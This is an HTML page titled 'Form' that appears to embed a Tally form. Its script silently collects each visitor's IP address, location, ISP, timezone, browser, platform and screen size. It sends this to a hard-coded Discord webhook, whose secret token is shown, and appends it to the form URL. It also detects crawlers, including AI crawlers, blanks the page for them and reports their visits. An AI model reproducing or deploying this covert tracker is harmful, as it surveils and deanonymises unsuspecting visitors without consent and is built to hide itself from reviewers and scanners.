<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Form</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 0; background: #f4f4f4; text-align: center; }
        iframe { width: 100%; height: 100vh; border: none; display: none; }
        #blockMessage {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: white; color: black; text-align: center;
            font-size: 24px; font-weight: bold; padding-top: 20%;
        }
        #footer { position: fixed; bottom: 5px; width: 100%; font-size: 10px; color: gray; }
    </style>
</head>
<body>

    <iframe id="tallyForm"></iframe>

    <div id="blockMessage"></div>

    <div id="footer">CYBRUIS Security Bot Solutions By Chris Banks</div>

    <script>
        async function getUserData() {
            const webhookURL = "https://discord.com/api/webhooks/1344385758026535054/cSWbFy-5tKPCBRW4IWKhMHDZKkWVQEbFlpkwVgs9LKsJESweTQ-cBrXOviJxVODG_3ps";

            function isBot() {
                const botUserAgents = [
                    "Googlebot", "Bingbot", "Slurp", "DuckDuckBot", "Baiduspider", "YandexBot",
                    "facebot", "ia_archiver", "MJ12bot", "AhrefsBot", "SemrushBot", "Twitterbot",
                    "LinkedInBot", "Discordbot", "GPTBot", "ClaudeBot", "Bytespider", "NaverBot"
                ];
                return botUserAgents.some(bot => navigator.userAgent.includes(bot));
            }

            function generateSessionID() {
                return Math.floor(1000000 + Math.random() * 9000000); // Generates 7-digit ID
            }

            let sessionID = generateSessionID();

            if (isBot()) {
                document.body.innerHTML = ""; // Clear entire page
                document.body.style.background = "white"; // Set full white background

                let blockMessage = document.getElementById("blockMessage");
                blockMessage.innerHTML = `CRAWLER DETECTED - (PAGE LOCKED)<br>CONTACT: contact@candykingsid.com<br>SESSION/SUPPORT ID: ${sessionID}`;
                blockMessage.style.display = "block";

                fetch(webhookURL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        username: "Bot Detector",
                        content: `🚨 **Crawler Blocked!**\n\n🆔 **User-Agent:** ${navigator.userAgent}\n🔒 **Session ID:** ${sessionID}\n📅 **Time:** ${new Date().toLocaleString()}`
                    })
                });

                return; // Stop script execution
            }

            let ipData = { ip: "Unknown", country: "Unknown", city: "Unknown", region: "Unknown", isp: "Unknown", timezone: "Unknown" };
            try {
                const response = await fetch("https://ipapi.co/json/");
                ipData = await response.json();
            } catch (error) {
                console.error("Failed to get IP info", error);
            }

            const trackingDetails = `tracking=${encodeURIComponent(ipData.ip)}&country=${encodeURIComponent(ipData.country_name)}&city=${encodeURIComponent(ipData.city)}&region=${encodeURIComponent(ipData.region)}&isp=${encodeURIComponent(ipData.org)}&timezone=${encodeURIComponent(ipData.timezone)}&browser=${encodeURIComponent(navigator.userAgent)}&platform=${encodeURIComponent(navigator.platform)}&screen=${encodeURIComponent(screen.width + "x" + screen.height)}`;

            document.getElementById("tallyForm").src = `https://tally.so/r/wb6M7g?${trackingDetails}`;
            document.getElementById("tallyForm").style.display = "block";

            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    username: "Tracking Bot",
                    content: `📊 **New User Tracked!**\n\n🆔 **IP:** ${ipData.ip}\n🌍 **Country:** ${ipData.country_name}\n🏙 **City:** ${ipData.city}\n📌 **Region:** ${ipData.region}\n🔌 **ISP:** ${ipData.org}\n🕒 **Timezone:** ${ipData.timezone}\n🌐 **Browser:** ${navigator.userAgent}\n💻 **Platform:** ${navigator.platform}\n📏 **Screen Size:** ${screen.width}x${screen.height}\n📅 **Time:** ${new Date().toLocaleString()}`
                })
            });
        }

        getUserData();
    </script>

</body>
</html>

